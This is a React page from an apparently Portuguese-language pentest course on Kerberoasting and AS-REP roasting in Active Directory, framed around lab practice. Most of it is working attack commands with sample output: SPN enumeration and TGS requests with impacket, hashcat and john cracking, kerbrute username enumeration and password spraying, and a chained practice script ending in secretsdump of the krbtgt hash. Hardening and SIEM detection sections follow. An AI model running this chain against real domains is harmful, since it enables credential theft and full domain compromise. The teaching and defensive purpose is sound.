import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Kerberoasting() {
  return (
    <PageContainer
      title="Kerberoasting + AS-REP Roasting"
      subtitle="Solicita TGS de service accounts, crackeia offline. Vetor #1 de comprometimento de AD."
      difficulty="intermediário"
      timeToRead="14 min"
      prompt="ad/kerberoasting"
    >
      <h2>Conceito</h2>
      <p>
        No Kerberos, qualquer usuário do domínio pode pedir um <strong>TGS</strong> (Ticket
        Granting Service) para um <em>SPN</em> (Service Principal Name). O TGS é cifrado com a senha
        do <strong>service account</strong> dono daquele SPN.
      </p>
      <p>
        Resultado: você (usuário comum) coleta o ticket cifrado e cracka <strong>offline</strong>{" "}
        a senha do service account. Se o service account for Domain Admin (comum), você é DA.
      </p>

      <OutputBlock label="o ataque em uma figura" type="muted">
{`     [Wallyson, user comum]                  [DC]                          [Atacante]
            │                                  │                                 │
            │  AS-REQ + AS-REP (TGT normal)    │                                 │
            │ ─────────────────────────────►  │                                 │
            │ ◄───────────────────────────── │                                 │
            │                                  │                                 │
            │  TGS-REQ "quero MSSQLSvc/sql01"  │                                 │
            │ ─────────────────────────────►  │                                 │
            │  TGS-REP cifrado com senha       │                                 │
            │      do svc_sql (RC4!)           │                                 │
            │ ◄───────────────────────────── │                                 │
            │                                  │                                 │
            │ ─────► joga em hashcat ──────────────────────────────────►       │
                                                                  ▼              │
                                                    "Senha@SQL2024" → svc_sql é DA → PWNED`}
      </OutputBlock>

      <h2>1) Identificar SPNs</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "impacket-GetUserSPNs acme.local/wallyson:'Senha@123' -dc-ip 10.10.10.5",
            out: `Impacket v0.12.0

ServicePrincipalName               Name              MemberOf                                          PasswordLastSet
---------------------------------- ---------------   ----------------------------------------          ----------------------
HTTP/intranet.acme.local           svc_intranet                                                        2023-08-12 14:23:11
MSSQLSvc/sql01.acme.local:1433     svc_sql           CN=Domain Admins,CN=Users,DC=acme,DC=local       2022-11-04 18:42:01    ← DA!
HOST/srv-iis01                     svc_iis                                                              2024-01-20 09:14:23
HTTP/jenkins.acme.local            svc_jenkins                                                          2023-04-15 11:23:42
LDAP/dc01.acme.local               krbtgt                                                               2024-09-01 00:00:00`,
            outType: "warning",
          },
          {
            comment: "alternativa: PowerShell (do dentro do AD)",
            cmd: "Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName,MemberOf",
            out: "(equivalente, mas precisa estar em Windows com RSAT)",
            outType: "muted",
          },
        ]}
      />

      <h2>2) Solicitar e capturar TGS</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "impacket-GetUserSPNs acme.local/wallyson:'Senha@123' -dc-ip 10.10.10.5 -request -outputfile spns.txt",
            out: `[*] Got TGS for HTTP/intranet.acme.local
[*] Got TGS for MSSQLSvc/sql01.acme.local:1433
[*] Got TGS for HOST/srv-iis01
[*] Got TGS for HTTP/jenkins.acme.local

$krb5tgs$23$*svc_intranet$ACME.LOCAL$HTTP/intranet.acme.local*$84a2c0f4e5d6...$8c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b1234567890abcdef...
$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01.acme.local~1433*$92b4d1g5f6e7...$1234567890abcdef8c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b...
$krb5tgs$23$*svc_iis$ACME.LOCAL$HOST/srv-iis01*$73c1e0f3d4c5...$2345678901bcdef08c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b...
$krb5tgs$23$*svc_jenkins$ACME.LOCAL$HTTP/jenkins.acme.local*$abc123def4...$89012345678901cdef8c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b...`,
            outType: "info",
          },
          {
            cmd: "wc -l spns.txt && head -1 spns.txt",
            out: `4 spns.txt
$krb5tgs$23$*svc_intranet$ACME.LOCAL$HTTP/intranet.acme.local*$84a2c0f4e5d6...`,
            outType: "default",
          },
        ]}
      />

      <h2>3) Crackear (offline)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            out: `hashcat (v6.2.6) starting

OpenCL Platform #1 [NVIDIA Corporation]
* Device #1: NVIDIA GeForce RTX 4090, 23842/24564 MB

Hashes: 4 digests; 4 unique digests, 4 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask

Speed.#1.........:    8.94 GH/s
Recovered........: 2/4 (50.00%) Digests
[...]

$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01.acme.local~1433*...:Senha@SQL2024
$krb5tgs$23$*svc_jenkins$ACME.LOCAL$HTTP/jenkins.acme.local*...:Jenkins!2024

Started: Fri Apr  3 17:14:23 2026
Stopped: Fri Apr  3 17:14:42 2026`,
            outType: "success",
          },
          {
            comment: "alternativa: john",
            cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs spns.txt",
            out: `Senha@SQL2024    (svc_sql)
Jenkins!2024     (svc_jenkins)`,
            outType: "info",
          },
        ]}
      />

      <h2>AS-REP Roasting (sem credencial!)</h2>
      <p>
        Variante ainda mais perigosa: contas com <code>UF_DONT_REQUIRE_PREAUTH</code>
        respondem AS-REQ <strong>sem credencial</strong>. Você só precisa de uma lista
        de usernames.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "lista de usuários (de OSINT, leak, enum4linux)",
            cmd: "cat users.txt",
            out: `admin
wallyson
maria
jsmith
svc_legacy
guest
backup`,
            outType: "default",
          },
          {
            cmd: "impacket-GetNPUsers acme.local/ -no-pass -dc-ip 10.10.10.5 -usersfile users.txt -format hashcat -outputfile asrep.txt",
            out: `Impacket v0.12.0

[!] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[!] User wallyson doesn't have UF_DONT_REQUIRE_PREAUTH set
[!] User maria doesn't have UF_DONT_REQUIRE_PREAUTH set
[!] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_legacy@ACME.LOCAL:abc123def456789abc...$789xyz0123456789ab0123456789ab0123456789ab0123456789...    ← achou!
[!] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[!] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set`,
            outType: "warning",
          },
          {
            cmd: "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
            out: `$krb5asrep$23$svc_legacy@ACME.LOCAL:...:LegacySvc!2020`,
            outType: "success",
          },
        ]}
      />

      <h2>Sem credencial inicial — Kerberoasting "blind"</h2>
      <p>
        Se você nem tem usuário, mas conhece nome de usuário (de OSINT) E o domínio,
        pode tentar requests forjados (raro, mas existe).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "kerbrute encontra usuários SEM credencial (enum)",
            cmd: "kerbrute userenum -d acme.local --dc 10.10.10.5 /usr/share/seclists/Usernames/Names/names.txt",
            out: `2026/04/03 17:21:14 >  Using KDC(s):
2026/04/03 17:21:14 >       10.10.10.5:88

2026/04/03 17:21:18 >  [+] VALID USERNAME:	admin@acme.local
2026/04/03 17:21:18 >  [+] VALID USERNAME:	jsmith@acme.local
2026/04/03 17:21:18 >  [+] VALID USERNAME:	maria@acme.local
2026/04/03 17:21:18 >  [+] VALID USERNAME:	svc_sql@acme.local
2026/04/03 17:21:18 >  [+] VALID USERNAME:	svc_intranet@acme.local

2026/04/03 17:21:42 >  Done! Tested 1000 usernames (5 valid) in 28.421 seconds`,
            outType: "warning",
          },
          {
            cmd: "kerbrute passwordspray -d acme.local --dc 10.10.10.5 valid_users.txt 'Welcome2024!'",
            out: `2026/04/03 17:24:08 >  [+] VALID LOGIN:	jsmith@acme.local:Welcome2024!`,
            outType: "error",
          },
        ]}
      />

      <h2>Defesa</h2>
      <CodeBlock
        language="powershell"
        title="hardening anti-Kerberoasting"
        code={`# 1. Senhas LONGAS para service accounts (32+ chars random)
# Microsoft recomenda 25+. Acima de 25 chars com complexidade,
# brute force é impraticável.

# 2. Usar Group Managed Service Accounts (gMSA)
# Senhas trocadas automaticamente a cada 30 dias, 240 chars
New-ADServiceAccount -Name 'gmsa_sql' -DNSHostName 'sql01.acme.local' \\
  -PrincipalsAllowedToRetrieveManagedPassword 'GROUP_ALLOWED'

# 3. Banir RC4 — forçar AES
# AD: Computer Configuration → Policies → Windows Settings → Security
# → Local Policies → Security Options → "Network security: Configure
# encryption types allowed for Kerberos" → MARQUE só AES128 + AES256

# 4. Auditar quem tem SPN definido (revisar mensalmente)
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | \\
  Select-Object Name, SamAccountName, ServicePrincipalName

# 5. Usuário NÃO deve ter SPN — só máquinas
# Migre apps para gMSA ou serviços genuínos

# 6. Para AS-REP roasting: AUDITAR PreauthNotRequired
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
# tudo que aparecer: Set-ADAccountControl -Identity X -DoesNotRequirePreAuth $false`}
      />

      <h2>Detecção em Splunk/SIEM</h2>
      <CommandTable
        title="EventIDs para alerta"
        variations={[
          { cmd: "4769", desc: "TGS request. Ticket Encryption Type 0x17 = RC4 (suspeito).", output: "Filtre EncryptionType=0x17 → suspeito." },
          { cmd: "4768", desc: "AS-REQ. Volume anormal de um único user = AS-REP roasting.", output: "Múltiplos usuários distintos → suspeito." },
          { cmd: "4625", desc: "Logon falho.", output: "Brute/spray combinado." },
          { cmd: "4738", desc: "User account changed (incluindo PreAuth).", output: "Auditar mudanças críticas." },
        ]}
      />

      <PracticeBox
        title="Pwn AD com Kerberoasting"
        goal="Em lab AD (GOAD/HTB), comprometer DA via roasting."
        steps={[
          "Com qualquer cred válida (mesmo low-priv): GetUserSPNs.",
          "Hashcat com rockyou + best64.",
          "Se quebrar conta DA: secretsdump direto.",
          "Se não: tente AS-REP com kerbrute userenum + GetNPUsers.",
        ]}
        command={`USER='lowpriv'
PASS='Welcome1'
DC='10.10.10.5'
DOMAIN='acme.local'

# 1) Kerberoasting
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile spns.txt

# 2) crack
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3) AS-REP backup plan
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/Names/names.txt | \\
  grep VALID | awk '{print $NF}' | cut -d@ -f1 > valid_users.txt
impacket-GetNPUsers $DOMAIN/ -no-pass -dc-ip $DC -usersfile valid_users.txt \\
  -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# 4) Com QUALQUER cred DA: dump tudo
impacket-secretsdump $DOMAIN/CRACKED_USER:CRACKED_PASS@$DC -just-dc`}
        expected={`(SPNs)
$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01.acme.local~1433*

(hashcat)
$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01.acme.local~1433*...:Senha@SQL2024

(secretsdump)
ACME\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f:::`}
        verify="Conseguir o hash do krbtgt = você pode forjar Golden Ticket = persistência total no domínio."
      />

      <AlertBox type="danger" title="Por que 'Vetor #1 de AD'">
        Em pentest de empresa, kerberoasting cai em 80%+ dos ambientes:
        usuários service criados há anos, com senhas curtas, esquecidos. Ferramenta padrão
        de qualquer pentester de AD. Defesa: gMSA + senhas longas + AES-only.
      </AlertBox>
    </PageContainer>
  );
}
